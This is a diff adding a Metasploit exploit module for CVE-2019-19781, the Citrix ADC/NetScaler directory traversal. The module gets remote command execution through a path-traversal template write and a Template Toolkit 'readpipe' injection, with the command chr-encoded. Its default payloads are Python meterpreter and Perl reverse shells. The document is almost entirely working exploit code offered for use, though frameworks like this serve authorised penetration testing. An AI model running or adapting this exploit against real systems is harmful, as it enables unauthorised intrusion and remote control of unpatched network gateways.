@@ -1,0 +1,157 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::CheckModule
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'                => 'Citrix ADC (NetScaler) Directory Traversal RCE',
+      'Description'         => %q{
+        This module exploits a directory traversal in Citrix Application Delivery Controller (ADC), aka
+        NetScaler, and Gateway 10.5, 11.1, 12.0, 12.1, and 13.0, to execute an arbitrary command payload.
+      },
+      'Author'              => [
+        'Project Zero India',           # PoC used by this module
+        'TrustedSec',                   # PoC used by this module
+        'James Brytan',                 # PoC contributed independently
+        'James Smith',                  # PoC contributed independently
+        'Marisa Mack',                  # PoC contributed independently
+        'Rob Vinson',                   # PoC contributed independently
+        'Sergey Pashevkin',             # PoC contributed independently
+        'Steven Laura',                 # PoC contributed independently
+        'mekhalleh (RAMELLA Sébastien)' # Module author (https://www.pirates.re/)
+      ],
+      'References'          => [
+        ['CVE', '2019-19781'],
+        ['EDB', '47901'],
+        ['EDB', '47902'],
+        ['URL', 'https://support.citrix.com/article/CTX267027/'],
+        ['URL', 'https://www.mdsec.co.uk/2020/01/deep-dive-to-citrix-adc-remote-code-execution-cve-2019-19781/']
+      ],
+      'DisclosureDate'      => '2019-12-17',
+      'License'             => MSF_LICENSE,
+      'Platform'            => ['python', 'unix'],
+      'Arch'                => [ARCH_PYTHON, ARCH_CMD],
+      'Privileged'          => false,
+      'Targets'             => [
+        ['Python',
+          'Platform'        => 'python',
+          'Arch'            => ARCH_PYTHON,
+          'Type'            => :python,
+          'DefaultOptions'  => {'PAYLOAD' => 'python/meterpreter/reverse_tcp'}
+        ],
+        ['Unix Command',
+          'Platform'        => 'unix',
+          'Arch'            => ARCH_CMD,
+          'Type'            => :unix_command,
+          'DefaultOptions'  => {'PAYLOAD' => 'cmd/unix/reverse_perl'}
+        ]
+      ],
+      'DefaultTarget'       => 0,
+      'DefaultOptions'      => {
+        'CheckModule'       => 'auxiliary/scanner/http/citrix_dir_traversal',
+        'HttpClientTimeout' => 3.5
+      },
+      'Notes'               => {
+        'AKA'               => ['Shitrix'],
+        'Stability'         => [CRASH_SAFE],
+        'Reliability'       => [REPEATABLE_SESSION],
+        'SideEffects'       => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+      }
+    ))
+
+    register_options([
+      OptString.new('TARGETURI', [true, 'Base path', '/'])
+    ])
+
+    register_advanced_options([
+      OptBool.new('ForceExploit', [false, 'Override check result', false])
+    ])
+  end
+
+  def cmd_unix_generic?
+    datastore['PAYLOAD'] == 'cmd/unix/generic'
+  end
+
+  def exploit
+    unless datastore['ForceExploit']
+      case check
+      when CheckCode::Vulnerable
+        print_good('The target appears to be vulnerable')
+      when CheckCode::Safe
+        fail_with(Failure::NotVulnerable, 'The target does not appear to be vulnerable')
+      else
+        fail_with(Failure::Unknown, 'The target vulnerability state is unknown')
+      end
+    end
+
+    print_status("Yeeting #{datastore['PAYLOAD']} payload at #{peer}")
+    vprint_status("Generated payload: #{payload.encoded}")
+
+    case target['Type']
+    when :python
+      execute_command(%(/var/python/bin/python2 -c "#{payload.encoded}"))
+    when :unix_command
+      if (res = execute_command(payload.encoded)) && cmd_unix_generic?
+        print_line(res.get_html_document.text.gsub(/undef error - Attempt to bless.*/m, ''))
+      end
+    end
+  end
+
+  def execute_command(cmd, _opts = {})
+    filename = rand_text_alpha(8..42)
+    nonce    = rand_text_alpha(8..42)
+
+    res = send_request_cgi(
+      'method'      => 'POST',
+      'uri'         => normalize_uri(target_uri.path, '/vpn/../vpns/portal/scripts/newbm.pl'),
+      'headers'     => {
+        'NSC_USER'  => "../../../netscaler/portal/templates/#{filename}",
+        'NSC_NONCE' => nonce
+      },
+      'vars_post'   => {
+        'url'       => rand_text_alpha(8..42),
+        'title'     => "[%template.new({'BLOCK'='print readpipe(#{chr_payload(cmd)})'})%]"
+      }
+    )
+
+    unless res && res.code == 200
+      print_error('No response to POST newbm.pl request')
+      return
+    end
+
+    res = send_request_cgi(
+      'method'      => 'GET',
+      'uri'         => normalize_uri(target_uri.path, "/vpn/../vpns/portal/#{filename}.xml"),
+      'headers'     => {
+        'NSC_USER'  => rand_text_alpha(8..42),
+        'NSC_NONCE' => nonce
+      },
+      'partial'     => true
+    )
+
+    unless res && res.code == 200
+      print_warning("No response to GET #{filename}.xml request")
+    end
+
+    register_files_for_cleanup(
+      "/netscaler/portal/templates/#{filename}.xml",
+      "/var/tmp/netscaler/portal/templates/#{filename}.xml.ttc2"
+    )
+
+    res
+  end
+
+  def chr_payload(cmd)
+    cmd.each_char.map { |c| "chr(#{c.ord})" }.join('.')
+  end
+
+end
